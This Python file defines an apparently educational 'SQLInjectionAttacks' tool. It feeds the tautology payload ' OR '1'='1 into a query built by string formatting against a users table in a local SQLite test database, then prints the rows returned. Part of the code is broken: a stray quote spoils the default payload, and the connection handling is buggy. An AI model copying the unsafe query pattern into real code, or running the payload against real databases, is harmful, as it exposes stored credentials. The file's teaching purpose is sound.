import os
import platform
import importlib

class SQLInjectionAttacks:
    def __init__(self, db_name="sqlite3"):
        """
        Initialize the class with database configuration.
        """
        self.db_name = db_name.lower()  # Store database type
        self.db_module = self.load_database_module(self.db_name)  # Dynamically load DB module

        # Default database connection functions
        self.db_connection_functions = {
            "sqlite3": self.db_module.connect if self.db_module else None,
        }

        # Attack configurations
        self.attacks = {
            1: {
                "function": self.get_user_credentials,
                "sqli_name": "Extract User Credentials",
                "default_query": "' OR '1'='1"
            }
        }

    def load_database_module(self, db_name):
        """
        Dynamically import the specified database module.
        Defaults to SQLite3 if the module is not found.
        """
        try:
            return importlib.import_module(db_name)
        except ImportError:
            print(f"Warning: {db_name} module not found. Defaulting to SQLite3.")
            return importlib.import_module("sqlite3")

    def manage_db_connection(self, attack_ID, query, db='test.db'):
        """
        Manages the database connection and executes the selected attack.
        """
        try:
            db_connect_function = self.db_connection_functions.get(self.db_name)
            if not db_connect_function:
                raise ValueError(f"Unsupported database type: {self.db_name}")

            db_connection = db_connect_function(db)
            db_cursor = db_connection.cursor()

            result = self.execute_attack(attack_ID, query, db_connection, db_cursor)
            return result

        except Exception as e:
            print(f"Database error: {e}")
            return None
        finally:
            if db_connection:
                db_connection.close()

    def execute_attack(self, attack_ID, query, db_connection, db_cursor):
        """
        Executes the attack based on attack_ID.
        """
        if attack_ID in self.attacks:
            return self.attacks[attack_ID]["function"](query, db_connection, db_cursor)
        else:
            raise ValueError(f"Invalid attack_ID: {attack_ID}")

    def get_user_credentials(self, query, db_connection, db_cursor):
        """
        Attempts an SQL injection attack to extract user credentials.
        """
        probe_query = f"SELECT * FROM users WHERE username = '{query}'"
        print(f"\nExecuting Query: {probe_query}")  # Debugging Output

        db_cursor.execute(probe_query)
        probe_result = db_cursor.fetchall()

        return probe_result

    def main_menu(self):
        """
        Main interactive menu for executing SQL injections.
        """
        while True:
            attack_ID = 1  # Default attack for demo

            db = input("Enter the database type (default: sqlite3): ").strip().lower() or "sqlite3"
            self.db_name = db  # Set the database type dynamically
            self.db_module = self.load_database_module(self.db_name)  # Reload DB module

            query = input("Enter the username/query to probe: ").strip() or "' OR '1'='1'"

            print(f"\nExecuting attack: {self.attacks[attack_ID]['sqli_name']}")
            result = self.manage_db_connection(attack_ID, query)

            if result:
                print("\nAttack Results:")
                for row in result:
                    print(row)
            else:
                print("\nNo results found or an error occurred.")

            if input("\nTry another attack? (y/n): ").strip().lower() != 'y':
                print("Exiting the program. Goodbye!")
                break
